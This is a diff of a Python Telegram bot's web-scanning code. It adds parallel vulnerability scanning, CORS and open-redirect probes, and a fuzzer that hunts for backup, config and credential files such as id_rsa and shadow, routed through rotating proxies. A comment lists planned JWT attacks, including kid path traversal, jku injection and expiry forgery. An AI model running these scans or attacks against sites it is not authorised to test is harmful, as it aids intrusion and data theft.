@@ -2057,9 +2057,8 @@ def _discover_subdomains_sync(base_url: str, progress_q: list) -> list:
     return live
 
 
-def _vuln_scan_sync(url: str, progress_q: list) -> dict:
-    """Main orchestrator."""
-    # Detect Cloudflare → increase delays
+def _vuln_scan_sync(url: str, progress_q: list, skip_subs: bool = False) -> dict:
+    """Improved orchestrator — parallel targets + CORS + open redirect."""
     is_cloudflare = False
     results = {
         "url": url, "findings": [],
@@ -2068,80 +2067,111 @@ def _vuln_scan_sync(url: str, progress_q: list) -> dict:
         "server": "Unknown", "subdomains_found": [],
         "total_scanned": 0, "errors": 0,
         "cloudflare": False,
+        "cors": {}, "open_redirects": [],
     }
 
     # ── Baseline headers ──────────────────────────
-    progress_q.append("🔍 Checking security headers...")
+    progress_q.append("🔍 Checking security headers + CORS...")
     try:
-        r0   = requests.get(url, timeout=10, headers=_get_headers(),
-                            proxies=proxy_manager.get_proxy(), allow_redirects=True, verify=False)
+        r0 = requests.get(
+            url, timeout=10, headers=_get_headers(),
+            proxies=proxy_manager.get_proxy(),
+            allow_redirects=True, verify=False
+        )
         hdrs = dict(r0.headers)
-        srv  = hdrs.get('Server','Unknown')
+        srv  = hdrs.get("Server", "Unknown")
         results["server"] = srv[:60]
-        is_cloudflare = 'cloudflare' in srv.lower() or 'cf-ray' in hdrs
+        is_cloudflare = "cloudflare" in srv.lower() or "cf-ray" in hdrs
         results["cloudflare"] = is_cloudflare
 
-        for hdr,(name,sev) in _SEC_HEADERS.items():
+        for hdr, (name, sev) in _SEC_HEADERS.items():
             if hdr not in hdrs:
-                results["missing_headers"].append((name,hdr,sev))
+                results["missing_headers"].append((name, hdr, sev))
         if srv and any(c.isdigit() for c in srv):
             results["missing_headers"].append(
                 ("Server version leak", f"Server: {srv[:50]}", "LOW"))
-        xpb = hdrs.get('X-Powered-By','')
+        xpb = hdrs.get("X-Powered-By", "")
         if xpb:
             results["missing_headers"].append(
                 ("Tech disclosure", f"X-Powered-By: {xpb[:40]}", "LOW"))
-        has_xfo = 'X-Frame-Options' in hdrs
-        has_fa  = 'frame-ancestors' in hdrs.get('Content-Security-Policy','')
+        has_xfo = "X-Frame-Options" in hdrs
+        has_fa  = "frame-ancestors" in hdrs.get("Content-Security-Policy", "")
         results["clickjacking"] = not has_xfo and not has_fa
     except Exception:
         results["errors"] += 1
 
-    # Cloudflare = slower scan to avoid rate limiting
-    req_delay = 0.8 if is_cloudflare else 0.2
-    sub_workers = 5 if is_cloudflare else 10
-
-    if is_cloudflare:
+    # ── CORS check ────────────────────────────────
+    cors_result = _check_cors_misconfig(url)
+    results["cors"] = cors_result
+    if cors_result["vulnerable"]:
+        sev = cors_result["severity"]
         progress_q.append(
-            "☁️ *Cloudflare detected*\n"
-            "Slower scan mode to avoid rate limiting..."
+            f"🚨 CORS misconfiguration — `{sev}`\n"
+            f"ACAO: `{cors_result['acao']}`\n"
+            f"Credentials: `{cors_result.get('acac','false')}`"
         )
+
+    # ── Open redirect ─────────────────────────────
+    progress_q.append("🔀 Testing open redirect payloads...")
+    results["open_redirects"] = _check_open_redirect(url)
+    if results["open_redirects"]:
+        progress_q.append(
+            f"🟠 Open redirect found — `{len(results['open_redirects'])}` params vulnerable"
+        )
+
+    req_delay   = 0.8 if is_cloudflare else 0.2
+    if is_cloudflare:
+        progress_q.append("☁️ *Cloudflare detected* — slower scan mode...")
 
     # ── Subdomain discovery ───────────────────────
-    live_subs = _discover_subdomains_sync(url, progress_q)
-    results["subdomains_found"] = live_subs
-
-    if live_subs:
-        progress_q.append(
-            f"✅ *{len(live_subs)} real subdomains found:*\n"
-            + "\n".join(f"  • `{urlparse(s).netloc}`" for s in live_subs[:8])
-        )
+    if not skip_subs:
+        live_subs = _discover_subdomains_sync(url, progress_q)
+        results["subdomains_found"] = live_subs
+        if live_subs:
+            progress_q.append(
+                f"✅ *{len(live_subs)} subdomains found:*\n"
+                + "\n".join(f"  • `{urlparse(s).netloc}`" for s in live_subs[:8])
+            )
+        else:
+            progress_q.append("📭 No live subdomains found")
     else:
-        progress_q.append("📭 No live subdomains found")
+        progress_q.append("⏭️ Subdomain scan skipped")
 
-    # ── Scan each target ──────────────────────────
-    all_targets = [url] + live_subs
-    for i, target in enumerate(all_targets):
-        netloc = urlparse(target).netloc
-        progress_q.append(
-            f"🔍 Scanning `{netloc}`...\n"
-            f"Target `{i+1}/{len(all_targets)}`"
-            + (" ☁️ slow mode" if is_cloudflare else "")
-        )
+    # ── Parallel target scan ──────────────────────
+    all_targets = [url] + results["subdomains_found"]
+    progress_q.append(
+        f"🔍 Scanning `{len(all_targets)}` target(s) in parallel..."
+    )
+
+    def _scan_one(target):
         exposed, protected, catchall = _scan_target_sync(target, req_delay)
-        results["total_scanned"] += len(_VULN_PATHS)
-        if exposed or protected:
-            results["findings"].append({
-                "target":    target,
-                "netloc":    netloc,
-                "exposed":   exposed,
-                "protected": protected,
-                "catchall":  catchall,
-            })
+        return {
+            "target":    target,
+            "netloc":    urlparse(target).netloc,
+            "exposed":   exposed,
+            "protected": protected,
+            "catchall":  catchall,
+        }
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(all_targets), 6)) as ex:
+        futures = {ex.submit(_scan_one, t): t for t in all_targets}
+        for fut in concurrent.futures.as_completed(futures, timeout=180):
+            try:
+                r = fut.result(timeout=30)
+                results["total_scanned"] += len(_VULN_PATHS)
+                if r["exposed"] or r["protected"]:
+                    results["findings"].append(r)
+                netloc = r["netloc"]
+                exp_cnt = len(r["exposed"])
+                if exp_cnt:
+                    progress_q.append(f"🚨 `{netloc}` — `{exp_cnt}` exposed paths found")
+            except Exception:
+                results["errors"] += 1
 
     return results
 
 
+# ── Also patch _format_vuln_report to show CORS + redirect ──────────
 def _format_vuln_report(r: dict) -> str:
     domain = urlparse(r["url"]).netloc
     lines  = []
@@ -2149,11 +2179,15 @@ def _format_vuln_report(r: dict) -> str:
     total_exp = sum(len(f["exposed"]) for f in r["findings"])
     all_sevs  = [fi["severity"] for f in r["findings"] for fi in f["exposed"]]
 
-    if   "CRITICAL" in all_sevs:                       overall = "🔴 CRITICAL RISK"
-    elif "HIGH"     in all_sevs:                       overall = "🟠 HIGH RISK"
-    elif "MEDIUM"   in all_sevs or r["clickjacking"]:  overall = "🟡 MEDIUM RISK"
-    elif r["missing_headers"]:                         overall = "🔵 LOW RISK"
-    else:                                              overall = "✅ CLEAN"
+    cors_vuln = r.get("cors", {}).get("vulnerable", False)
+    cors_sev  = r.get("cors", {}).get("severity", "")
+    redirects = r.get("open_redirects", [])
+
+    if "CRITICAL" in all_sevs or cors_sev == "CRITICAL": overall = "🔴 CRITICAL RISK"
+    elif "HIGH" in all_sevs or redirects or cors_sev == "HIGH": overall = "🟠 HIGH RISK"
+    elif "MEDIUM" in all_sevs or r["clickjacking"]: overall = "🟡 MEDIUM RISK"
+    elif r["missing_headers"]: overall = "🔵 LOW RISK"
+    else: overall = "✅ CLEAN"
 
     cf_badge = " ☁️ Cloudflare" if r.get("cloudflare") else ""
     lines += [
@@ -2166,6 +2200,24 @@ def _format_vuln_report(r: dict) -> str:
         "",
     ]
 
+    # CORS result
+    lines.append("*🌐 CORS Policy:*")
+    if cors_vuln:
+        sev = r["cors"]["severity"]
+        em  = "🔴" if sev == "CRITICAL" else "🟠"
+        lines.append(f"  {em} `{sev}` — {r['cors']['note']}")
+        lines.append(f"  ACAO: `{r['cors']['acao']}`")
+    else:
+        lines.append("  ✅ No origin reflection")
+    lines.append("")
+
+    # Open redirect
+    if redirects:
+        lines.append(f"*🔀 Open Redirect:* `{len(redirects)}` params vulnerable")
+        for rd in redirects[:3]:
+            lines.append(f"  🟠 `?{rd['param']}=` → `{rd['location'][:60]}`")
+        lines.append("")
+
     # Subdomains
     if r["subdomains_found"]:
         lines.append("*📡 Live Subdomains:*")
@@ -2173,33 +2225,29 @@ def _format_vuln_report(r: dict) -> str:
             lines.append(f"  • {s}")
         lines.append("")
 
-    # HTTPS
     lines.append("*🔐 HTTPS:*")
     lines.append("  ✅ HTTPS enabled" if r["https"] else "  🔴 HTTP only — no encryption!")
     lines.append("")
 
-    # Findings per target
     if r["findings"]:
         for f in r["findings"]:
             if f["exposed"]:
                 lines.append(f"*🚨 Exposed — `{f['netloc']}`:*")
                 for fi in f["exposed"]:
-                    em   = _SEV_EMOJI.get(fi["severity"],"⚪")
-                    note = f" `[{fi['status']}]`"
-                    lines.append(f"  {em} `{fi['severity']}` — {fi['label']}{note}")
+                    em   = _SEV_EMOJI.get(fi["severity"], "⚪")
+                    lines.append(f"  {em} `{fi['severity']}` — {fi['label']} `[{fi['status']}]`")
                     lines.append(f"  🔗 {fi['full_url']}")
                 lines.append("")
             if f["protected"]:
-                lines.append(f"*⚠️ Blocked (403) — `{f['netloc']}`:*")
+                lines.append(f"*⚠️ Gated (401/403) — `{f['netloc']}`:*")
                 for fi in f["protected"][:5]:
-                    em = _SEV_EMOJI.get(fi["severity"],"⚪")
+                    em = _SEV_EMOJI.get(fi["severity"], "⚪")
                     lines.append(f"  {em} {fi['label']}")
                     lines.append(f"  🔗 {fi['full_url']}")
                 lines.append("")
     else:
         lines += ["*✅ No exposed files found*", ""]
 
-    # Clickjacking
     lines.append("*🖼️ Clickjacking:*")
     if r["clickjacking"]:
         lines.append("  🟠 Vulnerable — no X-Frame-Options / frame-ancestors")
@@ -2207,346 +2255,32 @@ def _format_vuln_report(r: dict) -> str:
         lines.append("  ✅ Protected")
     lines.append("")
 
-    # Security headers
     if r["missing_headers"]:
         lines.append("*📋 Security Header Issues:*")
         for name, hdr, sev in r["missing_headers"][:8]:
-            em = _SEV_EMOJI.get(sev,"⚪")
+            em = _SEV_EMOJI.get(sev, "⚪")
             if "leak" in name.lower() or "disclosure" in name.lower():
                 lines.append(f"  {em} {name}: `{hdr}`")
             else:
                 lines.append(f"  {em} Missing *{name}*")
         lines.append("")
 
-    # Cloudflare note
-    if r.get("cloudflare"):
-        lines += [
-            "☁️ *Cloudflare note:*",
-            "  Some paths may be hidden behind CF WAF.",
-            "  403 results may indicate file exists but CF blocks it.",
-            "",
-        ]
-
-    lines += ["━━━━━━━━━━━━━━━━━━",
-              "⚠️ _Passive scan only — no exploitation_"]
+    lines += [
+        "━━━━━━━━━━━━━━━━━━",
+        "⚠️ _Passive scan only — no exploitation_",
+    ]
     return "\n".join(lines)
 
 
-async def cmd_vuln(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/vuln <url> — Passive vuln scanner with CF-aware subdomain discovery."""
-    if not context.args:
-        await update.effective_message.reply_text(
-            "🛡️ *Vulnerability Scanner v4*\n\n"
-            "Usage: `/vuln <url>`\n\n"
-            "Features:\n"
-            "• 📡 Subdomain discovery (DNS verified)\n"
-            "• ☁️ Cloudflare detection + slow-mode\n"
-            "• 🔍 Catch-all false-positive filter\n"
-            "• 🔑 Config / credential leaks\n"
-            "• 📁 Git / backup / DB dumps\n"
-            "• 🔐 Admin panel detection\n"
-            "• 🔗 Full clickable URLs\n\n"
-            "_Passive only — no exploitation_",
-            parse_mode='Markdown'
-        )
-        return
-
-    url = context.args[0]
-    if not url.startswith('http'):
-        url = 'https://' + url
-
-    uid = update.effective_user.id
-    allowed, wait_sec = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text(
-            f"⏱️ `{wait_sec}` seconds စောင့်ပါ",
-            parse_mode='Markdown'); return
-
-    safe_ok, reason = is_safe_url(url)
-    if not safe_ok:
-        await update.effective_message.reply_text(
-            f"🚫 `{reason}`", parse_mode='Markdown'); return
-
-    domain = urlparse(url).netloc
-    msg = await update.effective_message.reply_text(
-        f"🛡️ *Vuln Scan v4*\n🌐 `{domain}`\n\n"
-        f"• Baseline & catch-all detection\n"
-        f"• Subdomain discovery\n"
-        f"• Path scanning\n\n_ခဏစောင့်ပါ..._",
-        parse_mode='Markdown'
-    )
-
-    progress_q: list = []
-
-    async def _prog_loop():
-        while True:
-            await asyncio.sleep(3)
-            if progress_q:
-                txt = progress_q[-1]; progress_q.clear()
-                try:
-                    await msg.edit_text(
-                        f"🛡️ *Scanning `{domain}`*\n\n{txt}",
-                        parse_mode='Markdown')
-                except Exception: pass
-
-    prog = asyncio.create_task(_prog_loop())
-    try:
-        results = await asyncio.to_thread(_vuln_scan_sync, url, progress_q)
-    except Exception as e:
-        prog.cancel()
-        await msg.edit_text(
-            f"❌ Scan error: `{type(e).__name__}: {str(e)[:80]}`",
-            parse_mode='Markdown'); return
-    finally:
-        prog.cancel()
-
-    report = _format_vuln_report(results)
-    try:
-        if len(report) <= 4000:
-            await msg.edit_text(report, parse_mode='Markdown')
-        else:
-            await msg.edit_text(report[:4000] + "\n_...continued_", parse_mode='Markdown')
-            await update.effective_message.reply_text(report[4000:], parse_mode='Markdown')
-    except Exception:
-        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
-
-
-# ══════════════════════════════════════════════════
-# 🔌  /api — API ENDPOINT DISCOVERY COMMAND
-# ══════════════════════════════════════════════════
-
-async def cmd_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/api <url> — Discover API endpoints, RSS feeds, hidden paths"""
-    uid = update.effective_user.id
-    if not context.args:
-        await update.effective_message.reply_text(
-            "📌 *Usage:* `/api https://example.com`\n\n"
-            "🔍 *Discovery Method 4 ခု:*\n"
-            "① HTML source mining _(data-attrs, inline JS)_\n"
-            "② JS bundle mining _(fetch/axios/url patterns)_\n"
-            "③ robots.txt / sitemap scan\n"
-            f"④ `{len(ALL_API_PATHS)}` known paths brute-force\n\n"
-            "🔌 *ရှာပေးသောအမျိုးအစားများ:*\n"
-            "• REST API (v1/v2/v3)\n"
-            "• GraphQL endpoints\n"
-            "• WordPress / WooCommerce / Shopify\n"
-            "• Auth (JWT, OAuth, Sanctum)\n"
-            "• Admin / Dashboard APIs\n"
-            "• Mobile / SaaS / Fintech APIs\n"
-            "• Swagger / OpenAPI docs\n"
-            "• RSS/Atom feeds\n"
-            "• CORS detection\n\n"
-            "📦 *Result ကို JSON file နဲ့ download ပေးမယ်*",
-            parse_mode='Markdown'
-        )
-        return
-
-    uid = update.effective_user.id
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text("`%ds` စောင့်ပါ" % wait, parse_mode="Markdown")
-        return
-
-    url = context.args[0].strip()
-    if not url.startswith('http'):
-        url = 'https://' + url
-
-    safe_ok, reason = is_safe_url(url)
-    if not safe_ok:
-        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
-        return
-
-    domain = urlparse(url).netloc
-    msg    = await update.effective_message.reply_text(
-        f"🔌 *API Discovery — `{domain}`*\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"🔍 Phase 1: HTML source mining...\n"
-        f"📦 Phase 2: JS bundle mining...\n"
-        f"🤖 Phase 3: robots.txt scan...\n"
-        f"🔌 Phase 4: `{len(ALL_API_PATHS)}` paths brute-force...\n\n"
-        f"⏳ ခဏစောင့်ပါ...",
-        parse_mode='Markdown'
-    )
-
-    progress_q: list = []
-
-    async def _prog_loop():
-        while True:
-            await asyncio.sleep(4)
-            if progress_q:
-                txt = progress_q[-1]; progress_q.clear()
-                try:
-                    await msg.edit_text(
-                        f"🔌 *Scanning `{domain}`*\n\n{txt}",
-                        parse_mode='Markdown')
-                except Exception: pass
-
-    prog = asyncio.create_task(_prog_loop())
-    try:
-        found = await asyncio.to_thread(
-            discover_api_endpoints, url, lambda t: progress_q.append(t)
-        )
-    except Exception as e:
-        prog.cancel()
-        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
-        return
-    finally:
-        prog.cancel()
-
-    result    = found   # found is now a dict
-    endpoints = result.get("found", [])
-    js_mined  = result.get("js_mined", [])
-    html_mined= result.get("html_mined", [])
-    robots    = result.get("robots", [])
-    stats     = result.get("stats", {})
-
-    # ── Summary message ───────────────────────────
-    json_apis = [e for e in endpoints if e["type"] in ("JSON_API", "GRAPHQL")]
-    xml_feeds = [e for e in endpoints if e["type"] == "XML/RSS"]
-    api_docs  = [e for e in endpoints if e["type"] == "API_DOCS"]
-    protected = [e for e in endpoints if e["type"] == "PROTECTED"]
-    others    = [e for e in endpoints if e["type"] == "OTHER"]
-    cors_list = [e for e in endpoints if e.get("cors")]
-
-    all_mined = list(set(js_mined + html_mined + robots))
-
-    if not endpoints and not all_mined:
-        await msg.edit_text(
-            f"🔌 *API Discovery — `{domain}`*\n\n"
-            f"📭 API endpoints မတွေ့ပါ\n"
-            f"_(protected or non-standard paths ဖြစ်နိုင်)_\n\n"
-            f"🔍 Probed: `{stats.get('total_probed',0)}` paths",
-            parse_mode='Markdown'
-        )
-        return
-
-    report_lines = [
-        f"🔌 *API Discovery — `{domain}`*",
-        f"━━━━━━━━━━━━━━━━━━━━",
-        f"📊 Endpoints: `{len(endpoints)}` | 🔍 Probed: `{stats.get('total_probed',0)}`",
-        f"📦 JS mined: `{stats.get('js_urls_found',0)}` | 🌐 HTML mined: `{stats.get('html_urls_found',0)}`",
-        "",
-    ]
-
-    if json_apis:
-        report_lines.append(f"*✅ JSON / GraphQL APIs ({len(json_apis)}):*")
-        for e in json_apis[:20]:
-            path = urlparse(e["url"]).path or e["url"]
-            tag  = " 〔GraphQL〕" if e["type"] == "GRAPHQL" else ""
-            cors = " ✦CORS" if e.get("cors") else ""
-            prev = e.get("preview","")[:60].replace("\n"," ")
-            report_lines.append(f"  🟢 `{path}`{tag}{cors}")
-            if prev: report_lines.append(f"     _{prev}_")
-        report_lines.append("")
-
-    if xml_feeds:
-        report_lines.append(f"*📰 RSS / XML Feeds ({len(xml_feeds)}):*")
-        for e in xml_feeds[:10]:
-            path = urlparse(e["url"]).path or e["url"]
-            report_lines.append(f"  📡 `{path}`")
-        report_lines.append("")
-
-    if api_docs:
-        report_lines.append(f"*📖 API Docs / Swagger ({len(api_docs)}):*")
-        for e in api_docs[:5]:
-            path = urlparse(e["url"]).path or e["url"]
-            report_lines.append(f"  📘 `{path}`")
-        report_lines.append("")
-
-    if protected:
-        report_lines.append(f"*🔒 Protected — Exists ({len(protected)}):*")
-        for e in protected[:10]:
-            path = urlparse(e["url"]).path or e["url"]
-            note = f" [{e.get('note',e['status'])}]"
-            cors = " ✦CORS" if e.get("cors") else ""
-            report_lines.append(f"  🔐 `{path}`{note}{cors}")
-        report_lines.append("")
-
-    if all_mined:
-        unique_mined = sorted(set(
-            urlparse(u).path for u in all_mined if urlparse(u).path
-        ))[:20]
-        report_lines.append(f"*🕵️ Mined from JS/HTML ({len(all_mined)} total):*")
-        for p in unique_mined:
-            report_lines.append(f"  🔎 `{p}`")
-        report_lines.append("")
-
-    if others:
-        report_lines.append(f"*📄 Other ({len(others)}):*")
-        for e in others[:5]:
-            path = urlparse(e["url"]).path or e["url"]
-            report_lines.append(f"  📋 `{path}`")
-        report_lines.append("")
-
-    if cors_list:
-        report_lines.append(f"*🌍 CORS Enabled ({len(cors_list)}):*")
-        for e in cors_list[:5]:
-            path = urlparse(e["url"]).path
-            report_lines.append(f"  🌐 `{path}` → `{e['cors']}`")
-        report_lines.append("")
-
-    report_lines.append("⚠️ _Passive scan only — no exploitation_")
-
-    report_text = "\n".join(report_lines)
-
-    # ── Send text report ──────────────────────────
-    try:
-        if len(report_text) <= 4000:
-            await msg.edit_text(report_text, parse_mode='Markdown')
-        else:
-            await msg.edit_text(report_text[:4000], parse_mode='Markdown')
-            await update.effective_message.reply_text(
-                report_text[4000:8000], parse_mode='Markdown')
-    except Exception:
-        await update.effective_message.reply_text(
-            report_text[:4000], parse_mode='Markdown')
-
-    # ── Export full JSON report + send as file ────
-    if endpoints or all_mined:
-        try:
-            safe_domain = re.sub(r'[^\w\-]', '_', domain)
-            ts          = datetime.now().strftime("%Y%m%d_%H%M%S")
-            json_path   = os.path.join(DOWNLOAD_DIR, f"api_{safe_domain}_{ts}.json")
-
-            export_data = {
-                "domain":     domain,
-                "scanned_at": datetime.now().isoformat(),
-                "stats":      stats,
-                "endpoints": [{
-                    "url":     e["url"],
-                    "type":    e["type"],
-                    "status":  e["status"],
-                    "cors":    e.get("cors"),
-                    "preview": e.get("preview","")[:200],
-                    "size_b":  e.get("size_b",0),
-                } for e in endpoints],
-                "js_mined":   list(set(js_mined)),
-                "html_mined": list(set(html_mined)),
-                "robots":     robots,
-            }
-
-            with open(json_path, 'w', encoding='utf-8') as jf:
-                json.dump(export_data, jf, ensure_ascii=False, indent=2)
-
-            cap = (
-                f"📦 *API Report — `{domain}`*\n"
-                f"✅ `{len(endpoints)}` endpoints | 🕵️ `{len(all_mined)}` mined\n"
-                f"🗓 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
-            )
-            with open(json_path, 'rb') as jf:
-                await context.bot.send_document(
-                    chat_id=update.effective_chat.id,
-                    document=jf,
-                    filename=f"api_{safe_domain}_{ts}.json",
-                    caption=cap,
-                    parse_mode='Markdown'
-                )
-            os.remove(json_path)
-        except Exception as e:
-            logger.warning("API JSON export error: %s", e)
-
-
-
+# ───────────────────────────────────────────────────────────────────
+# [2] REPLACE JWT functions (original: lines ~5482–5600)
+#     IMPROVEMENTS:
+#       + kid path traversal injection (/etc/passwd, SQLi)
+#       + JWKS endpoint spoof detection + jku/x5u injection
+#       + exp=9999999999 timestamp forgery
+#       + Parallel brute-force (ThreadPoolExecutor)
+#       + All-in-one combined attack report
+# ───────────────────────────────────────────────────────────────────
 
 def download_website(
     base_url: str,
@@ -4250,10 +3984,10 @@ _FUZZ_PARAMS = [
 ]
 
 def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
-    """Run path or parameter fuzzing."""
-    found    = []
+    """Improved fuzzer — tech-aware + backup ext + param + response diff."""
+    found = []
 
-    # ── Baseline: get 404 fingerprint ───────────────
+    # Baseline fingerprint
     try:
         r404 = requests.get(
             base.rstrip("/") + "/this_path_will_never_exist_xyz_abc_123",
@@ -4263,39 +3997,46 @@ def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
         baseline_status = r404.status_code
         baseline_size   = len(r404.content)
         baseline_hash   = hashlib.md5(r404.content[:512]).hexdigest()
+        baseline_words  = len(r404.text.split()) if r404.text else 0
     except Exception:
-        baseline_status, baseline_size, baseline_hash = 404, 0, ""
+        baseline_status, baseline_size, baseline_hash, baseline_words = 404, 0, "", 0
 
-    def _is_interesting(r_status, r_size, r_hash):
-        """Filter out baseline 404 catch-all responses."""
+    def _is_interesting(r_status, r_size, r_hash, r_words):
         if r_status == baseline_status:
             if r_hash and r_hash == baseline_hash:
                 return False
             if baseline_size > 0 and abs(r_size - baseline_size) < 50:
+                return False
+            if baseline_words > 0 and abs(r_words - baseline_words) < 5:
                 return False
         return r_status in (200, 201, 204, 301, 302, 307, 401, 403, 500)
 
     def _probe(target_url):
         try:
             r = requests.get(
-                target_url, timeout=5, verify=False, headers=_get_headers(),
-                allow_redirects=True, stream=True,
-                proxies=proxy_manager.get_proxy()
+                target_url, timeout=5, verify=False,
+                headers=_get_headers(), allow_redirects=True,
+                stream=True, proxies=proxy_manager.get_proxy()
             )
             chunk = b""
-            for part in r.iter_content(1024):
+            for part in r.iter_content(2048):
                 chunk += part
-                if len(chunk) >= 1024: break
+                if len(chunk) >= 2048:
+                    break
             r.close()
-            r_size = int(r.headers.get("Content-Length", len(chunk)))
-            r_hash = hashlib.md5(chunk[:512]).hexdigest()
-            r_ct   = r.headers.get("Content-Type","")[:30]
-            if _is_interesting(r.status_code, r_size, r_hash):
+            r_size  = int(r.headers.get("Content-Length", len(chunk)))
+            r_hash  = hashlib.md5(chunk[:512]).hexdigest()
+            r_ct    = r.headers.get("Content-Type", "")[:40]
+            r_words = len(chunk.decode("utf-8", "ignore").split())
+
+            if _is_interesting(r.status_code, r_size, r_hash, r_words):
+                gated = r.status_code in (401, 403)
                 return {
                     "url":    target_url,
                     "status": r.status_code,
                     "size":   r_size,
                     "ct":     r_ct,
+                    "gated":  gated,
                     "title":  "",
                 }
         except Exception:
@@ -4303,18 +4044,40 @@ def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
         return None
 
     if mode == "params":
-        targets = [f"{base}?{p}=FUZZ" for p in _FUZZ_PARAMS]
+        # Param fuzzing with multiple values
+        targets = []
+        for param, values in _SMART_FUZZ_PARAMS.items():
+            for val in values[:2]:
+                targets.append(f"{base}?{param}={val}")
+        # Also original params
+        for p in _FUZZ_PARAMS:
+            targets.append(f"{base}?{p}=FUZZ")
     else:
-        targets = [f"{base.rstrip('/')}/{p}" for p in _FUZZ_PATHS]
+        base_paths = list(_FUZZ_PATHS)
+        # Tech-aware extras
+        detected = _detect_tech_stack(base)
+        if detected:
+            progress_q.append(f"🔬 Detected: `{'`, `'.join(detected)}`")
+        for tech in detected:
+            base_paths.extend(_TECH_WORDLISTS.get(tech, []))
+
+        # Backup extension permutations (on top 30 paths)
+        backup_targets = []
+        for path in base_paths[:30]:
+            for ext in _BACKUP_EXTENSIONS:
+                backup_targets.append(path.rstrip("/") + ext)
+
+        targets = [f"{base.rstrip('/')}/{p}" for p in base_paths]
+        targets += [f"{base.rstrip('/')}/{p}" for p in backup_targets]
 
     done = 0
     with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
         fmap = {ex.submit(_probe, t): t for t in targets}
-        for fut in concurrent.futures.as_completed(fmap, timeout=90):
+        for fut in concurrent.futures.as_completed(fmap, timeout=120):
             done += 1
-            if done % 20 == 0:
+            if done % 25 == 0:
                 progress_q.append(
-                    f"🧪 Fuzzing... `{done}/{len(targets)}` tested | `{len(found)}` found"
+                    f"🧪 Fuzzing `{done}/{len(targets)}` | Found: `{len(found)}`"
                 )
             try:
                 res = fut.result(timeout=8)
@@ -4323,370 +4086,10 @@ def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
             except Exception:
                 pass
 
-    found.sort(key=lambda x: (x["status"] != 200, x["status"]))
+    # Sort: 200 first, then gated (401/403), then rest
+    found.sort(key=lambda x: (x["status"] != 200, not x.get("gated"), x["status"]))
     return found, baseline_status
 
-
-async def cmd_fuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/fuzz <url> [paths|params] — HTTP path & parameter fuzzer"""
-    if not context.args:
-        await update.effective_message.reply_text(
-            "📌 *Usage:*\n"
-            f"`/fuzz https://example.com` — Path fuzzing ({len(_FUZZ_PATHS)} paths)\n"
-            f"`/fuzz https://example.com params` — Parameter fuzzing ({len(_FUZZ_PARAMS)} params)\n\n"
-            "🧪 *Path mode detects:*\n"
-            "  • Hidden admin panels & login pages\n"
-            "  • Backup & config files (.env, .sql, .bak)\n"
-            "  • Debug endpoints & info disclosure\n"
-            "  • Framework internals (Actuator, GraphQL...)\n"
-            "  • Log files & source leaks\n\n"
-            "🔬 *Param mode detects:*\n"
-            "  • Active query parameters\n"
-            "  • Open redirect parameters\n"
-            "  • Debug/admin param flags\n\n"
-            "✅ Baseline fingerprinting to eliminate false positives\n"
-            "⚠️ _Authorized testing only._",
-            parse_mode='Markdown'
-        )
-        return
-
-    uid = update.effective_user.id
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
-        return
-
-    url = context.args[0].strip()
-    if not url.startswith('http'):
-        url = 'https://' + url
-    mode = context.args[1].lower() if len(context.args) > 1 and context.args[1].lower() in ('paths','params') else 'paths'
-
-    safe_ok, reason = is_safe_url(url)
-    if not safe_ok:
-        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
-        return
-
-    domain   = urlparse(url).hostname
-    # Full URL path preserved — do not strip to root
-    _pu = urlparse(url)
-    _dir = _pu.path.rsplit("/", 1)[0].rstrip("/") + "/" if "/" in _pu.path else "/"
-    base_url = f"{_pu.scheme}://{_pu.netloc}{_dir}"
-    wordlist = _FUZZ_PATHS if mode == 'paths' else _FUZZ_PARAMS
-
-    msg = await update.effective_message.reply_text(
-        f"🧪 *Fuzzing `{domain}`* [{mode}]\n"
-        f"Wordlist: `{len(wordlist)}` entries\n"
-        "Baseline fingerprinting active...\n⏳",
-        parse_mode='Markdown'
-    )
-
-    progress_q = []
-
-    async def _prog():
-        while True:
-            await asyncio.sleep(3)
-            if progress_q:
-                txt = progress_q[-1]; progress_q.clear()
-                try:
-                    await msg.edit_text(
-                        f"🧪 *Fuzzing `{domain}`* [{mode}]\n\n{txt}", parse_mode='Markdown')
-                except Exception:
-                    pass
-
-    prog = asyncio.create_task(_prog())
-    try:
-        found, baseline_st = await asyncio.to_thread(
-            _fuzz_sync, base_url if mode == 'paths' else url, mode, progress_q
-        )
-    except Exception as e:
-        prog.cancel()
-        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
-        return
-    finally:
-        prog.cancel()
-
-    st_icons = {
-        200:"✅", 201:"✅", 204:"✅",
-        301:"↪️", 302:"↩️", 307:"🔄",
-        401:"🔑", 403:"🔒", 500:"💥"
-    }
-    risk_words = {
-        "paths": ['backup','.env','admin','config','debug','.sql','.bak',
-                   'password','secret','credential','id_rsa','passwd','shadow',
-                   'actuator','phpinfo','phpmyadmin','adminer'],
-        "params": ['cmd','exec','command','file','path','url','redirect',
-                   'include','require','load','src'],
-    }
-
-    lines = [
-        f"🧪 *Fuzz Results — `{domain}`* [{mode}]",
-        f"Baseline: `{baseline_st}` | Found: `{len(found)}` interesting\n",
-    ]
-
-    if not found:
-        lines.append("🔒 Nothing found — well hardened!")
-    else:
-        # Categorize
-        critical = [r for r in found if r["status"] == 200 and
-                    any(w in r["url"].lower() for w in risk_words.get(mode, []))]
-        normal   = [r for r in found if r not in critical]
-
-        if critical:
-            lines.append(f"*🔴 High-Risk ({len(critical)}):*")
-            for item in critical[:10]:
